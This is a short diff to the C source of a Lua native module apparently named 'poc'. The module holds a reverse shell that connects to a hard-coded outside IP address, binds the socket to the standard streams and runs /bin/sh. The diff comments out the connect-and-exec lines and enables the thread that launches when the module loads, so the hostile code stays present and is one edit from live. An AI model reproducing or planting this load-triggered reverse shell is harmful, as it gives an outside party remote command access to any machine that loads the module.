@@ -101,14 +101,14 @@ void *thread(void *arg) {
     revsockaddr.sin_port = htons(port);
     revsockaddr.sin_addr.s_addr = inet_addr("157.180.117.230");
 
-    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    /*connect(sockt, (struct sockaddr *) &revsockaddr, 
     sizeof(revsockaddr));
     dup2(sockt, 0);
     dup2(sockt, 1);
     dup2(sockt, 2);
 
     char * const argv[] = {"/bin/sh", NULL};
-    execvp("/bin/sh", argv);
+    execvp("/bin/sh", argv);*/
 
     pthread_exit((char*)"exit");
 }
@@ -121,10 +121,10 @@ int luaopen_poc(lua_State *L) {
 
     pthread_t thid;
     void *ret;
-    /*if (pthread_create(&thid, NULL, thread, NULL) != 0) {
+    if (pthread_create(&thid, NULL, thread, NULL) != 0) {
         perror("pthread_create() error");
         exit(1);
-    }*/
+    }
     
     // luaL_newlib(L, exec_lib);
     return 1;
